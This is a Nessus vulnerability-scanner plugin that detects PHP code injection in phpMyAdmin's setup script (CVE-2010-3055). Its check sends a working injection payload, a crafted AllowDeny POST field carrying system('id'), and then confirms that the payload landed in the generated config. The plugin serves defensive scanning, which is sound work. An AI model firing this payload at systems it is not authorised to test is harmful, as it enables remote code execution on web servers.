#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(48908);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_cve_id("CVE-2010-3055");
  script_bugtraq_id(42591);
  script_osvdb_id(67310);
  script_xref(name:"Secunia", value:"41058");

  script_name(english:"phpMyAdmin setup.php Arbitrary PHP Code Execution (PMASA-2010-4)");
  script_summary(english:"Checks if code can be injected into the config file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP application that may allow
execution of arbitrary code."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The setup script included with the version of phpMyAdmin installed on
the remote host does not properly sanitize user-supplied input before
using it to generate a config file for the application.  Submitting a
specially crafted POST request can result in arbitrary PHP code
injection.

A remote attacker could exploit this by using the setup script to
generate a configuration file with injected PHP code, save it on
the server, and load it, causing arbitrary PHP code to be executed
with the privileges of the web server."
  );
   # http://sourceforge.net/tracker/?func=detail&aid=3045132&group_id=23067&atid=377408
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b30f398f");
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.phpmyadmin.net/home_page/security/PMASA-2010-4.php"
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to phpMyAdmin 2.11.10.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/08/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/08/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/08/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpMyAdmin", "www/PHP");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");


port = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:'phpMyAdmin', port:port, exit_on_fail:TRUE);

# Bail on versions >= 3.x, which are not vulnerable
if (install['ver'] =~ '^[0-9]' && install['ver'] !~ '^[0-2]\\.')
  exit(0, 'phpMyAdmin '+install['ver']+' on port '+port+' is not affected.');

# The first request makes sure the page exists, the PMA config is writeable,
# and extracts the token
url = install['dir']+'/scripts/setup.php';
full_url = build_url(qs:install['dir']+'/', port:port);
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

# If the config can't be written to disk, this cannot be exploited - even
# if the software is unpatched.  In which case, only continue if paranoid.
if ('Can not load or save configuration' >< res[2])
{
  if (report_paranoia < 2)
    exit(1, 'The phpMyAdmin install at '+build_url(qs:install['dir']+'/', port:port)+' might be unpatched, but cannot be exploited.');
  else
    config_writeable = FALSE;
}
else config_writeable = TRUE;

# Extract the token.
token = NULL;
pat = 'input type="hidden" name="token" value="([^"]+)"';
match = eregmatch(string:res[2], pattern:pat);
if (match) token = match[1];
else exit(1, "Unable to extract token from "+build_url(qs:url, port:port));

# The second request attempts to inject the PHP code
watermark = SCRIPT_NAME+'-'+unixtime();  # this lets us know if a config was generated
phpcode = "system('id')";
expected_out1 = 'Servers (1)</div><div class="data">' + watermark;
expected_out2 = "$cfg['Servers'][$i]['AllowDeny']['order']['a']['b'][''." + phpcode + ".''] = '1';";

postdata =
  'token='+token+'&'+
  'action=addserver_real&'+
  'host='+watermark+'&'+
  'submit_save=Add&'+
  'AllowDeny_order=1&'+
  'AllowDeny[a][b][\'.' + phpcode + '.\']=1';
res = http_send_recv3(
  method:"POST",
  item:url,
  port:port,
  data:postdata,
  content_type:"application/x-www-form-urlencoded",
  exit_on_fail:TRUE
);

# If a config was generated (whether injection worked or not),
# the response should at least show the hostname we provided
if (expected_out1 >!< res[2])
  exit(1, 'Config generation failed for PMA install at '+full_url);

# The third request checks to see if it was successful
res = http_send_recv3(
  method:"POST",
  item:url,
  port:port,
  data:'token='+token+'&action=download',
  content_type:"application/x-www-form-urlencoded",
  exit_on_fail:TRUE
);

if (expected_out2 >< res[2])
{
  if (report_verbosity > 0)
  {
    report =
      '\nBy making a series of requests, Nessus was able to determine the'+
      '\nfollowing phpMyAdmin installation is vulnerable :\n\n' +
      '  ' + full_url + '\n';

    if (!config_writeable)
    {
      report +=
        '\nEven though the software is unpatched, the web server does not'+
        '\nhave permission to write the configuration file to disk, which'+
        '\nmeans the vulnerability cannot be exploited at this time.\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else exit(0, 'The phpMyAdmin install at '+full_url+' is not affected.');
